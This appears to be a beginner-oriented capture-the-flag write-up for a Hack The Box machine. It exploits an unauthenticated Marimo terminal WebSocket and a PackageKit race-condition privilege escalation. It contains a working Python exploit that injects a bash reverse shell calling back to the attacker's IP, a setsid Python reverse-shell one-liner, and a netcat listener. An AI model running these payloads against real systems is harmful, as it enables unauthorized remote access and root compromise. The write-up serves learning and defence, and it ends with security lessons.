 > **Beginner tip — What is TTL?** Every IP packet travels through routers to reach its destination. Each router decrements the TTL by 1. Linux starts packets at TTL 64; Windows starts at 128. By the time a packet reaches you, Linux machines typically show ~63 (one hop) and Windows shows ~127. This is a quick OS guess — not always accurate, but usually right. ## Exploit / Initial Foothold

CVE-2026-39987 — Marimo Unauthenticated Terminal RCE

CVE = Common Vulnerabilities and Exposures. It's a numbered identifier for a known security flaw.

The vulnerability: Marimo exposes a terminal WebSocket endpoint at /terminal/ws. This terminal gives you a shell on the server. In the vulnerable version, this endpoint has no authentication — anyone who can reach it can execute commands.

What is a WebSocket? Normal HTTP is like a phone call where you speak, hang up, they call back, they speak, hang up, etc. — one message at a time. A WebSocket is like leaving the call connected — both sides can send messages freely at any time without re-connecting. This is how browser-based terminals work: your keystrokes go one way, terminal output comes back the other way, all over a persistent connection.

Why is /terminal/ws unauthenticated a big deal? The marimo notebook terminal runs commands directly on the server's operating system. It's designed for developers to use locally. Exposing it externally without login protection is equivalent to giving a stranger a keyboard connected to your server.

The Exploit Script

```
python
import asyncio
import websockets
import ssl
import sys

async def trigger():
    # Target and Local configuration
    uri = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"
    
    # Bypass certificate checks on the HTB box cleanly
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    print("[*] Connecting to Marimo unauthenticated terminal WebSocket...")
    try:
        async with websockets.connect(uri, ssl=ssl_context) as ws:
            print("[+] Connection established!")
            print("[*] Flushing initial terminal banners...")
            try:
                # Flush the initial greeting buffer
                await asyncio.wait_for(ws.recv(), timeout=1.5)
            except asyncio.TimeoutError:
                pass

            # Payload uses interactive bash execution
            # The trailing \r\n simulates hitting 'Enter' physically in the PTY
            cmd_string = "bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'\r\n"
            print(f"[*] Injecting persistent payload...")
            await ws.send(cmd_string)

            print("\n[========= KEEPING SOCKET ALIVE =========]")
            print("[*] WebSocket pinned open. Go to your netcat listener window!")
            print("[*] Do NOT close this terminal tab or press Ctrl+C here.")
            print("[========================================]\n")

            # Infinite loop ensures the script never exits, preventing SIGHUP to the shell
            while True:
                output = await ws.recv()
                # Uncomment to debug stream communication if needed:
                # print(f"[Target Log]: {output.strip()}")

    except Exception as e:
        print(f"[-] WebSocket stream disconnected: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(trigger())
    except KeyboardInterrupt:
        print("\n[*] Script stopped manually. Connection terminated.")
```

 
**Breaking down the script line by line:**
 
| Code | Plain English |
|------|--------------|
| `uri = "wss://...terminal/ws"` | The address of the unprotected terminal WebSocket |
| `ssl_context.verify_mode = ssl.CERT_NONE` | Skip SSL certificate validation — HTB uses a self-signed cert that Python rejects by default |
| `websockets.connect(uri, ssl=ssl_context)` | Open a persistent connection to the terminal |
| `await asyncio.wait_for(ws.recv(), timeout=1.5)` | Read and discard the initial "welcome" banner the terminal sends |
| `cmd_string = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\r\n"` | The reverse shell payload — see below |
| `while True: output = await ws.recv()` | Keep the WebSocket alive so the reverse shell doesn't get killed when Python exits |
 
> **What is a Reverse Shell?**
>
> A **reverse shell** is when the *victim machine* reaches out and connects *to you*, giving you a command-line interface on that machine.
>
> Why "reverse"? Normally you'd connect *to* a server. But here, the server is behind a firewall and you can't connect to it directly. So you make the server connect to *you* instead. You listen on a port, the exploit tells the server "connect here", and it does.
>
> **The payload:** `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`
> - `bash -i` → open an interactive bash shell
> - `>& /dev/tcp/YOUR_IP/4444` → redirect its output to a TCP connection to your IP on port 4444
> - `0>&1` → also redirect input from that same connection
>
> The `\r\n` at the end simulates pressing Enter in the terminal.
 
> **Why keep the WebSocket alive (the `while True` loop)?**
> When a parent process dies, it sends `SIGHUP` to its children — telling them to also quit. If the Python script exits after sending the payload, the WebSocket closes, which kills the terminal, which kills your reverse shell. The infinite loop prevents the script from exiting, keeping the connection alive.

### Shell Stability — Why Your Shell Might Die
 
The initial reverse shell is fragile. If you press `Ctrl+C`, run certain commands, or the WebSocket gets disrupted, it dies. Here's how to make it stable.
 
**Option 1 — Quick Python PTY upgrade:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
# Then:
# Ctrl+Z (suspend shell)
stty raw -echo; fg
export TERM=xterm
```
 
> **What is a PTY?**
> PTY = Pseudo Terminal. A raw netcat shell has no terminal emulation — it can't handle arrow keys, `Ctrl+C` properly, or full-screen programs like `vim`. Spawning a PTY makes the shell behave like a real terminal window.
 
**Option 2 — Stable setsid shell (your method — recommended if shell keeps dying):**
 
```bash
# On the victim machine — write and run a stable shell script
cat > shell.sh << 'EOF'
setsid python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.xx.xxx",4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")' < /dev/null > /dev/null 2>&1 &
EOF
chmod 777 shell.sh; ./shell.sh
 
# On your attacker machine — second listener:
nc -lvnp 4445
```
 
> **Why `setsid`?**
> `setsid` creates a new **session** for the process, detaching it from the controlling terminal. This means closing the WebSocket or original shell won't send a kill signal to the new shell. It runs independently in the background. The `< /dev/null > /dev/null 2>&1` redirects away from the terminal entirely, and `&` puts it in the background. Together, this creates a shell that survives the death of its parent.
 

 
## Privilege Escalation
 
### What Is Privilege Escalation?
 
You have a shell as `marimo` — a regular user with limited permissions. Root (administrator) has full control over the system. **Privilege escalation** (privesc) is the process of going from low-privilege user → root.
 
### Automated Enumeration with linPEAS

> **What is PackageKit?**
> PackageKit is a system service that handles installing/removing software packages on Linux. It's what powers the graphical software installer in Ubuntu's desktop environment. It runs with root privileges because installing software requires root access.
 
### CVE-2026-41651 — PackageKit TOCTOU LPE
 
**LPE** = Local Privilege Escalation (you need to already be on the machine, then this gets you root)
 
**TOCTOU** = **T**ime **O**f **C**heck **T**o **T**ime **O**f **U**se — a class of race condition vulnerability
 
> **What is a TOCTOU race condition?**
>
> Imagine a security guard who checks your ID card at the door, lets you in, but then you swap your ID with a fake one before they can verify again. The guard checked a real ID (Time Of Check), but you used a fake one to do something (Time Of Use). The gap between check and use is the race window.
>
> In PackageKit's case:
> 1. **PackageKit checks** if it's allowed to install a package → allowed
> 2. **Attacker swaps** the package content for a malicious one during the tiny gap
> 3. **PackageKit installs** the malicious package as root → root-owned files appear on disk
>
> The exploit creates a SUID bash binary — a copy of `/bin/bash` that runs as root regardless of who executes it.
 
> **What is SUID?**
> SUID (Set User ID) is a special permission bit on Linux executables. When set on a file owned by root, *anyone* who runs that file gets root's privileges for the duration of the program. An SUID bash at `/tmp/.suid_bash` means any user who runs `/tmp/.suid_bash -p` gets a root shell.

If the TOCTOU race doesn't win on the first try (race conditions are timing-dependent — they don't always succeed immediately):

## Key Security Lessons
 
**1. SSRF Can Expose Hidden Infrastructure**
The subdomain was invisible to public scans but reachable via SSRF. Internal services should never be discoverable via external user-controlled requests. Network segmentation and blocking SSRF at the WAF/proxy layer prevents this.
 
**2. Developer Tools Should Never Be Internet-Facing**
Marimo's terminal is designed for local developer use. Exposing `/terminal/ws` publicly — even authenticated — is risky. Unauthenticated is catastrophic. Internal tools need network-level isolation, not just application-level auth.
 
**3. Software Versions Matter**
PackageKit 1.2.8-2ubuntu1.2 was vulnerable; 1.2.8-2ubuntu1.5 is patched. A difference of three minor package revisions is the difference between a secure system and full root compromise. Keep systems updated and use vulnerability scanners to catch these gaps.
 
**4. Race Conditions Are Hard to Eliminate**
TOCTOU flaws are among the hardest bugs to fix — the window can be microseconds wide. Proper fixes usually involve atomic operations, file locking (`flock`), or moving the verification *after* the action rather than before.
